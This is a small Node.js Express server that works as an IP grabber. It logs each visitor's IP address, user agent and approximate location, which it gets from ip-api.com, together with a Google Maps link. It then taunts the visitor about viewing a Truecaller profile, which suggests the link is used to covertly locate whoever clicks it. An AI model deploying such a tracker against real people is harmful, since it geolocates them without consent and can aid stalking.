const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");

const app = express();

const logFilePath = path.join(__dirname, "logs", "ips.log");
const PORT = process.env.PORT || 3000;

// Make sure logs folder exists
if (!fs.existsSync(path.join(__dirname, "logs"))) {
    fs.mkdirSync(path.join(__dirname, "logs"));
}

// Function to log to file
function logToFile(text) {
    fs.appendFile(logFilePath, text + "\n", (err) => {
        if (err) console.error("Error writing log:", err);
    });
}

app.get("/", async (req, res) => {
    let ip =
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress;

    // normalize IPv6 localhost
    if (ip === "::1" || ip === "127.0.0.1") {
        ip = "LOCALHOST";
    } else if (ip.includes("::ffff:")) {
        ip = ip.replace("::ffff:", "");
    }

    const ua = req.headers["user-agent"] || "Unknown Device";
    const timestamp = new Date().toISOString();

    let geo = {
        country: "Unknown",
        region: "Unknown",
        city: "Unknown",
        isp: "Unknown"
    };

    if (ip !== "LOCALHOST") {
        try {
            const response = await axios.get(`http://ip-api.com/json/${ip}`);
            geo = response.data;
        } catch (err) {
            console.error("Geo lookup failed");
        }
    }

    const logText = `
[${timestamp}]
IP: ${ip}
Country: ${geo.country}
Region: ${geo.regionName}
City: ${geo.city}
ISP: ${geo.isp}
Maps: https://www.google.com/maps/search/?api=1&query=${geo.lat},${geo.lon}
UA: ${ua}
-----------------------------`;

    logToFile(logText);

    res.send("<h1>y r u checking my truecaller profile</h1>");
});

app.listen(PORT, () => console.log(`Running on port ${PORT}`));
